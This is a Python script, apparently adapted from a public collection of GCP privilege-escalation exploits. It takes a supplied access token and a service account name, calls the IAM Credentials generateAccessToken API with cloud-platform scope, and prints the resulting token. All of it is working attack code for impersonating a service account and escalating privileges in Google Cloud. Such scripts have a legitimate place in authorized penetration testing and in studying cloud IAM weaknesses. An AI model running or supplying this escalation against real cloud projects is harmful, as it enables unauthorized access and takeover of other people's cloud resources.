#!/usr/bin/python3

import requests
import json

from apiclient.discovery import build
import google.oauth2.credentials

sBanner = """

 ######    ######  ########    
##    ##  ##    ## ##     ##     
##        ##       ##     ##      
##   #### ##       ########      
##    ##  ##       ##           
##    ##  ##    ## ##            
 ######    ######  ##            

iam_serviceAccounts_getAccessToken.py

"""

# Ref: https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.getAccessToken.py

sUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"

print(sBanner)

# --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- #

sDirtyAccessToken = input("AccessToken: ")
sAccessToken = str(sDirtyAccessToken).strip()
print("[+] sAccessToken: " + str(sAccessToken) + "")

sDirtyServiceAccountName = input("ServiceAccountName: ")
sServiceAccountName = str(sDirtyServiceAccountName).strip()
print("[+] sServiceAccountName: " + str(sServiceAccountName) + "")

# --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- # --- #

sEnter = input("Press the [Enter] key to continue... ")

credentials = google.oauth2.credentials.Credentials(sAccessToken)
service = build(serviceName='iamcredentials', version='v1', credentials=credentials)

dBody = {
    'scope': [
        'https://www.googleapis.com/auth/iam',
        'https://www.googleapis.com/auth/cloud-platform'
    ]
}

sName = 'projects/-/serviceAccounts/'+sServiceAccountName
res = service.projects().serviceAccounts().generateAccessToken(name=sName, body=dBody).execute()

print(json.dumps(res, indent=4))